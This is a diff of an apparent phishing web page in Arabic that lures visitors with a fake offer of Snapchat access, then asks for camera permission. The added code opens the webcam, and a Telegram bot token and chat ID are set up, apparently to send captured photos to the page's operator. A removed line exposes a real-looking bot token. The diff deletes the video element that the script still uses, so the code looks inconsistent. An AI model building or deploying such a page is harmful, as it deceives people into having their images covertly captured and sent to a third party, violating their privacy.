@@ -43,9 +43,7 @@ button{
 </head>
 <body>
 
-<h2>اضغط للوصول الى سناب شات مونسيف</h2>
-
-<video id="video" autoplay playsinline></video>
+<h2>اضغط للسماح بالكاميرا</h2>
 
 <button onclick="captureAndSend()">
 متابعة
@@ -55,13 +53,19 @@ button{
 
 <script>
 
-const BOT_TOKEN = "7793041544:AAEdwlYT8IEY52knXFSmyasP_MzAibgA0Ss";
+const BOT_TOKEN = "ضع_التوكن_الجديد_هنا";
 const CHAT_ID = "7191557045";
 
 const video = document.getElementById("video");
+
+navigator.mediaDevices.getUserMedia({
+    video:true
+})
+.then(stream=>{
+    video.srcObject = stream;
 })
 .catch(err=>{
-    alert("حساب منصف");
+    alert("يجب السماح بالكاميرا");
 });
 
 async function captureAndSend(){
